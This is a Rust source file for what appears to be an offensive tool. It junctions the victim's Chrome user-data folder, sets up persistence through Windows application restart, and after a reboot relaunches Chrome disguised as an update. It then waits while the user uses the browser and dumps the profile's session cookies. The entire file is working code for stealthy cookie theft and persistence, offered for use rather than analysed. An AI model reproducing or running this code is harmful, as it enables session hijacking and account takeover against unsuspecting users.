use futures::StreamExt;
use chromiumoxide::browser::{Browser, BrowserConfig};
use std::fs;
use std::env;
use std::path::Path;
use std::time::Duration;

#[async_std::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "debug")]
    println!("[*] Retreaving username...");
    let username = env::var("USERNAME")?;

    let junc_path = Path::new("C:\\temp\\pengrey");

    let chrome_path_string = format!(
        "C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data",
        username
    );

    let chrome_path = Path::new(&chrome_path_string);

    #[cfg(feature = "debug")]
    println!("[*] Checking if junction exists...");
    if !junction::exists(junc_path)? {
        #[cfg(feature = "debug")]
        println!("[*] Creating dir junction...");
        junction::create(chrome_path, junc_path)?;

        #[cfg(feature = "debug")]
        println!("[*] Setting up persistence...");
        phantom_persist_rs::register_application_restart();

        #[cfg(feature = "debug")]
        println!("[+] Registered application restart");

        #[cfg(feature = "debug")]
        println!("[+] Sleeping 60 seconds to ensure registration");
        std::thread::sleep(std::time::Duration::from_secs(60));

        #[cfg(feature = "debug")]
        println!("[+] Starting message loop thread. Go ahead shutdown/restart.");
        phantom_persist_rs::message_loop_thread();
    } else {
        #[cfg(feature = "debug")]
        println!("[*] Starting browser...");
        let (mut browser, mut handler) = Browser::launch(BrowserConfig::builder()
            .with_head()
            .arg("--start-maximized")
            .arg("--no-startup-window")
            .user_data_dir(junc_path)
            .viewport(None)
            .disable_default_args()
            .build()?
        ).await?;

        let handle = async_std::task::spawn(async move {
            while let Some(h) = handler.next().await {
                match h {
                    Ok(_) => continue,
                    Err(_) => break,
                }
            }
        });

        // Open page for whats new (simulate update)
        let _ = browser.new_page("https://developer.chrome.com/new").await?;

        #[cfg(feature = "debug")]
        println!("[*] Giving user access to user for compromise (1 min for test) ...");
        async_std::task::sleep(Duration::from_secs(60)).await;

        #[cfg(feature = "debug")]
        println!("[*] Time is up.");

        #[cfg(feature = "debug")]
        println!("[*] Retrieving cookies...");
        let cookies = browser.get_cookies().await?;

        #[cfg(feature = "debug")]
        println!("[+] Cookies:");
        cookies.iter().for_each(|cookie| println!("[>] Name: {}\n    Domain {}\n    Expires: {}", cookie.name, cookie.domain, cookie.expires));

        browser.close().await?;
        browser.wait().await?;
        handle.await;

        #[cfg(feature = "debug")]
        println!("[*] Removing junction and dir...");
        junction::delete(junc_path)?;
        fs::remove_dir(junc_path)?;

        #[cfg(feature = "debug")]
        println!("[*] Sleeping 15 seconds to see results ...");
        async_std::task::sleep(Duration::from_secs(15)).await;
    }

    Ok(())
}
